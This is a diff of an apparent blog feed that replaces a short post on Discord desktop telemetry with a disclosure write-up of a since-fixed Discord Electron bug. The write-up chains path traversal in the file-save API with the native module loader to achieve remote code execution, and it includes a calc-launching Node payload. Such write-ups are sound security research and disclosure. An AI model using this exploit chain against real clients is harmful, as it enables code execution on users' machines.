-&lt;h3 id=&#34;overview&#34;&gt;Overview&lt;/h3&gt;
-&lt;p&gt;On connection of the WebSocket in Discord&amp;rsquo;s desktop app, it sends a collection of information about the user&amp;rsquo;s OS setup. Below is an example of the telemetry on my current setup.&lt;/p&gt;
-&lt;h3 id=&#34;hex-view&#34;&gt;Hex View&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://pbs.twimg.com/media/Ens0SofW8AEsS-E?format=png&amp;amp;name=small&#34; alt=&#34;A view of the message in a Hex Editor&#34;  /&gt;&lt;/p&gt;
-&lt;p&gt;(That hex editor is &lt;a class=&#34;link&#34; href=&#34;https://github.com/WerWolv/ImHex&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;ImHex by WerWolv&lt;/a&gt; by the way)&lt;/p&gt;
-&lt;h3 id=&#34;simplified-view&#34;&gt;Simplified View&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;properties:
-os Linux
-browser Discord Client
-release_channel canary
-client_version 00115
-os_version 599-zen1-1-zen
-os_arch x64
-window_manager i3,i3
-distro &amp;quot;Arch Linux&amp;quot;
-
-presence:
-status online
-
-activities:
-afks false
-compress false
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;adapted-from-a-twitter-threadhttpstwittercomojoojmedstatus1331695740394086400&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://twitter.com/OjOojmed/status/1331695740394086400&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;Adapted from a Twitter thread&lt;/a&gt;&lt;/h2&gt;
+        <guid>/discord-1click-xss-to-rce/</guid>
+        <description>&lt;h2 id=&#34;electron-isolation-overview&#34;&gt;Electron Isolation Overview&lt;/h2&gt;
+&lt;p&gt;Discord&amp;rsquo;s desktop app is made with &lt;a class=&#34;link&#34; href=&#34;https://electronjs.org&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Electron&lt;/a&gt;. The (modern) Electron security model focuses on having the browser sandbox, the renderer process, and the main process. each are isolated from each other as separate processes so require some interface to communicate, like so:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    main world (scripts inside the site)
+      ↑                            |
+      |       contextBridge        |
+      |                            ↓
+ isolated world (limited node as preload)
+      ↑ ipcMain                    |
+      |                            |
+      |                ipcRenderer ↓
+           main process (node)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.electronjs.org/docs/latest/api/ipc-main&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;ipcMain&lt;/code&gt;&lt;/a&gt; and &lt;a class=&#34;link&#34; href=&#34;https://www.electronjs.org/docs/latest/api/ipc-renderer&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;ipcRenderer&lt;/code&gt;&lt;/a&gt; are event-based ways to communicate between the renderer and main process. The renderer doesn&amp;rsquo;t have access to all capabilities and it&amp;rsquo;s generally recommended to use it largely for such communication for security.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.electronjs.org/docs/latest/api/context-bridge&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;contextBridge&lt;/code&gt;&lt;/a&gt; exposes functions in the preload (isolated world) to the main world in the &lt;code&gt;window&lt;/code&gt; object.&lt;/p&gt;
+&lt;h2 id=&#34;discord-native-modules&#34;&gt;Discord Native Modules&lt;/h2&gt;
+&lt;p&gt;Discord have their own native modules system with their updater, allowing separate modules for their purposes. The main modules they have are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;discord_desktop_core&lt;/code&gt; - Loaded by the app (&lt;code&gt;app.asar&lt;/code&gt;) which creates the main window with the client&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;discord_voice&lt;/code&gt; - Native libraries for voice chat / screenshare / etc&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;discord_rpc&lt;/code&gt; - Exposes some Node modules for creating and managing the client&amp;rsquo;s &lt;a class=&#34;link&#34; href=&#34;https://discord.com/developers/docs/topics/rpc&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RPC server&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;These are exposed to the main world (the Discord webapp loaded) via their own exposed context bridge, &lt;code&gt;DiscordNative&lt;/code&gt;. Specifically, &lt;code&gt;DiscordNative.nativeModules.requireModule(name)&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;requireModule&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/^discord_[a-z0-9_-]+$/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;erlpack&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#34; is not a whitelisted native module&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;They use Node&amp;rsquo;s &lt;code&gt;require&lt;/code&gt;, which looks scary but the input is explicitly checked to begin with &lt;code&gt;discord_&lt;/code&gt; or being &lt;code&gt;erlpack&lt;/code&gt;. The paths (&lt;code&gt;module.paths&lt;/code&gt;) which can be required are carefully controlled earlier on. However, what if we could add our own file in one of the paths which we could then require?&lt;/p&gt;
+&lt;h2 id=&#34;discord-native-file-saving&#34;&gt;Discord Native File Saving&lt;/h2&gt;
+&lt;p&gt;Discord have an API in their context bridge for saving files with a UI prompt for where with &lt;code&gt;DiscordNative.fileManager.saveWithDialog&lt;/code&gt;, this is why we need 1-click, as the user must click save themselves. We can supply our own contents, filename, and default directory. The default directory is appended to the Downloads folder for the running user. However, it isn&amp;rsquo;t sanitized or checked for &lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-path-traversal&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;path traversal&lt;/a&gt;, so we can give it &lt;code&gt;../../../../../&lt;/code&gt; (etc) to escape to the root dir.&lt;/p&gt;
+&lt;p&gt;Another context bridge API, &lt;code&gt;DiscordNative.fileManager.getModulePath()&lt;/code&gt;, gives us the path straight to an allowed path by the native module requirer. So we can combine them for a full path into the directory we want.&lt;/p&gt;
+&lt;h2 id=&#34;bringing-it-all-together&#34;&gt;Bringing it all together&lt;/h2&gt;
+&lt;p&gt;Combining these separate functions and knowledge, we can make our exploit:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Save file with dialog with:
+&lt;ul&gt;
+&lt;li&gt;Filename: &lt;code&gt;discord_rce.js&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Contents: our Node payload, for example opening calc - &lt;code&gt;require(&#39;child_process&#39;).exec(&#39;calc.exe&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Base path: &lt;code&gt;../../../../&lt;/code&gt; (etc) + module path&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Require our self-written file with the native module API&lt;/li&gt;
+&lt;li&gt;Node execution (profit!)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;reporting&#34;&gt;Reporting&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;12th October 2020: Reported to Discord via HackerOne&lt;/li&gt;
+&lt;li&gt;13th October 2020: Fixed by checking path given to native file saving function&lt;/li&gt;
+&lt;li&gt;13th October 2020: Given $100 bounty&lt;/li&gt;
+&lt;/ul&gt;
 </description>
         </item>
         
